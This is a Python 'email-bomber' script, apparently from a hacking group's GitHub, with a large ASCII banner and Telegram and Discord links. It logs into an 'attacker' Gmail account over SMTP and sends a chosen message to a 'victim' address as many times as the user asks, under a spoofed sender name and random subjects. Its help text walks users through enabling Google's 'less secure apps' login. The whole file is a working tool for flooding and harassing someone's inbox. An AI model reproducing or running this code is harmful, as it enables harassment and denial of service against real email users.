#!/bin/python
# email-bomber v1.0.0
# coded by: @level4security
# coded by: https://t.me/shadowcrawler187
# coded by: https://t.me/spectertraww
# github.com/levelsec/email-bomber
# If you use any part from this code, give me the credits, please, read the License
import sys
from os import system, name, urandom
import smtplib
import time
import getpass


def banner():

    discord_server = "\033[96mhttps://discord.gg/7bzmFBY \033[91m" 
    telegram_channel = "\033[96mhttps://t.me/level4security \033[91m"
    github = "\033[96mhttps://github.com/levelivsec \033[91m" 
    a_link = "\033[92mhttps://t.me/shadowcrawler187 \033[91m"
    a_link2 = "\033[96mhttps://t.me/spectertraww \033[91m" 

    print(f'''\033[91m
  _ _                               ____                  _               
 |  ____|               (_) |      |  _ \                | |              
 | |__   _ __ ___   __ _ _| |______| |_) | ___  _ __ ___ | |__   ___ _ __ 
 |  __| | '_ ` _ \ / _` | | |______|  _ < / _ \| '_ ` _ \| '_ \ / _ \ '__|
 | |____| | | | | | (_| | | |      | |_) | (_) | | | | | | |_) |  __/ |   
 |______|_| |_| |_|\__,_|_|_|      |____/ \___/|_| |_| |_|_.__/ \___|_|        
                                                                                                                                                                                                                            
                     \|/
                       `--+--'
                          |
                      ,--'#`--.                 DISCORD SERVER
                      |#######|                 $>:{discord_server}
                   _.-'#######`-._               
                ,-'###############`-.           TELEGRAM
              ,'#####################`,         $>:{telegram_channel}    
             |#########################|              
            |###########################|       GITHUB
           |#############################|      $>:{github}                     
           |#############################|           
           |#############################|      Shadow Crawler => {a_link}    
            |###########################| 
             \#########################/        Specter Traww => {a_link2} 
              `.#####################,'         ##########################
                `._###############_,'           #   version: 1.0.0       #
                   `--..#####..--'              ##########################                       ,-.--.
*._____________________________________________________________________________________________,' (Bomb)
                                                                                                   `--'  ''') 
                                                                                   
   
def keyboardinteruptHandler():
     print('\033[91m[\033[92mx\033[91m] \033[96mCancelling please wait..! \033[97m')
     time.sleep(2)
     sys.stdout.flush()
     sys.exit()
    

def cls():
	if name == "posix":
		system("clear")
		
	else:
		system("cls")
		
def email_login(email_server):
    atck_email = input('\033[96mAttacker Gmail Address :\033[97m ')
    atck_pass = getpass.getpass("\033[96mYour password :\033[97m")
    try:
        email_server.login(atck_email, atck_pass)
        print("\033[91m[\033[92mi\033[91m] \033[92mLogin was successiful! \033[97m")
        
    except smtplib.SMTPAuthenticationError:
        print(''' \033[92m[\033[91m!\033[92m] \033[91mAuthentication error!,check to see if you password or email is correct.
        \033[97m''')
        sys.exit()
        
    except KeyboardInterrupt:
        keyboardinteruptHandler()
    return atck_email    
       
             

def send_mail(email_server, sender_email):
    try:
        anonymous_name = input('\033[96mAnonymous name :\033[97m ')
        victim_email = input('\033[96mVictim Gmail Address:\033[97m ')
        message = input('\033[96mMessage:\033[97m ')
        email_count = int(input('\033[96mNumber of send:\033[97m '))
        
        for count in range(1, email_count + 1):
            subject = urandom(10)
            msg = f"From:{anonymous_name}\n Subject:{subject}\n {message}"
            email_server.sendmail(sender_email, victim_email, msg)
             
            print(f"[\033[92mi\033[97m] \033[96mSending mail \033[92m[\033[91m{str(count)}\033[92m]\033[97m")
            time.sleep(1)
            print( "[\033[92mi\033[97m]\033[92m Mail was successifully send!\033[97m\n")
            
            
        print( "[\033[92mi\033[97m]\033[92mDone sending your mails!\033[97m")
        sys.exit() 
               
    except Exception as ex:
        print(str(ex))
    except KeyboardInterrupt:
        keyboardinteruptHandler()

def execute_bomb():
     cls()
     try:
        with smtplib.SMTP("smtp.gmail.com", 587) as email_server:
            email_server.ehlo()
            email_server.starttls()
                
            sender_email = email_login(email_server)
                
            send_mail(email_server, sender_email)
            sys.exit()
     except Exception as ex:
        print(str(ex)) 
            
        sys.exit() 
def show_help():
    cls()
    print('''
    \033[96mLess secure apps & your Google Account\033[97m
    ---------------------------------------

    If an app, script, software or site doesn’t meet google security standards, Google might block anyone who’s 
    trying to sign in to your account from it. Less secure 
    apps can make it easier for hackers to get in to 
    so blocking sign-ins from these apps helps keep your account safe. 

    If you try to run this script you may face some issues, especially authentication errors when trying to login to your account
    so inorder for this script to work you should allow login to you gmail from less secure apps including this tool.

    Go to the website below and allow less secure apps to login to your account

    \033[92mhttps://myaccount.google.com/lesssecureapps\033[97m

    Enabling less secure apps to access Gmail
    
    for more help you pink me on telegram
    \033[96mhttps://t.me/shadowcrawler187\033[97m 

    hit Enter key when you are done reading this!
    ''')
    _ = input()   
    execute_bomb()        
   
def aid_user():
    print( "[\033[92mi\033[97m]\033[96mPlease make sure you read the \033[92mhelp\033[96m before you precede!,!\033[97m")
    user_prompt =input('''[\033[92mi\033[97m]\033[92mType \033[91mhelp\033[92m to show help or \033[91mprecede \033[92mto continue! :\033[97m''')
    if user_prompt == "help":
        show_help()
    elif user_prompt == "precede":         
       execute_bomb()
    else:
        print( "[\033[91m!\033[97m]\033[91mInvalid option please try again!\033[97m\n")
        aid_user()        
             
    
def main():
    banner()
    aid_user()
  
                 
if __name__ == "__main__":
    main()        
        
        
        
        
        
        
        
        
        
        
        
                                                                         
